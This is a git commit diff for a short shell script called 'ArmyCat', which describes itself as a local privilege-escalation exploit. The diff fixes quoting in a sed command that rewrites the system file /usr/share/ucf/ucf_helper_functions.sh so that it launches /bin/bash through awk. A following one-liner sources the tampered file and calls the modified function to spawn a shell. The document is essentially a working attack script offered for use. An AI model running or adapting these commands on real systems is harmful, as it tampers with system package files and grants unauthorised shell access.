178d3310d415052d50e6dde8835f710834df8d6c
ZoeyTheArtGirl <sharkplayz1634@gmail.com>
2026-09-11 10:00:45 +0100

    Fix quotes. (Quotes, just like rules, suck.)

--- ArmyCat.sh
+++ ArmyCat.sh
@@ -1,7 +1,8 @@
 # ArmyCat - another script editing LPE.
 
 # Edit the script 
-sudo sed -i '/handle_deleted_ucf_file()/,/locfile=/ { /if \[-n/,/fi/c\    sudo awk '\''BEGIN {system("/bin/bash")}'\''\n    locfile="$1"' } /usr/share/ucf/ucf_helper_functions.sh
+sudo sed -i '/handle_deleted_ucf_file()/,/locfile=/ { /if \[-n/,/fi/c\  awk '\''BEGIN {system("/bin/bash")}'\''; locfile="$1"
+}' /usr/share/ucf/ucf_helper_functions.sh
 
 # Trigger the LPE - somehow a one-liner, LOLFAO.
 sudo ucfr fpkg /tmp/fpkg.conf; . /usr/share/ucf/ucf_helper_functions.sh; PKGNAME=fpkg handle_deleted_ucf_file "/tmp/fpkg.conf" "/tmp/fpkgdir" "/tmp"
